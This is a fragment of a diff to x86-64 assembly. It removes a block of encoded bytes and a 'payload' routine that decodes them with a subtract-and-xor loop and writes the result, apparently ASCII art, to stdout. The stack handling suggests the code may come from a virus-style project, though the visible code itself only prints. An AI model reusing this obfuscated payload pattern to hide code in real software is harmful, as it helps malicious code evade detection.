-        db 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57
-        db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x52, 0x55, 0x55, 0x55, 0x55, 0x55
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x55
-        db 0x55, 0x55, 0x55, 0x5d, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x5d
-        db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x55
-        db 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55
-        db 0x55, 0x55, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
-        db 0x57, 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x55
-        db 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x55
-        db 0x55, 0x55, 0x55, 0x55, 0x55, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x55, 0x55, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x55, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x55, 0x55, 0x55, 0x55, 0x57, 0x55
-        db 0x55, 0x55, 0x52, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x61, 0x55, 0x55, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x55
-        db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x55, 0x55, 0x57, 0x55
-        db 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x55, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x55, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x41
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57, 0x57
-        db 0x57, 0x57, 0x57, 0x57, 0x57, 0x55, 0x57, 0x55
-        db 0x41
-        len equ $-msg
-
-    payload:
-        pop rsi                                             ; setting up decoding loop
-        mov rcx, len
-        lea rdi, [r15 + ST_PAYLOAD_ADDR]
-
-        .decode:
-            lodsb                                           ; load byte from rsi into al
-            sub  al, 50                                     ; decoding it
-            xor  al, 5
-            stosb                                           ; store byte from al into rdi
-            loop .decode                                    ; sub 1 from rcx and continue loop until rcx = 0
-
-        lea rsi, [r15 + ST_PAYLOAD_ADDR]
-        mov rax, SYS_WRITE
-        mov rdi, STDOUT
-        mov rdx, len
-        syscall
-
-cleanup:
+.cleanup:
     add rsp, 5000
     pop rsp
     pop rdx
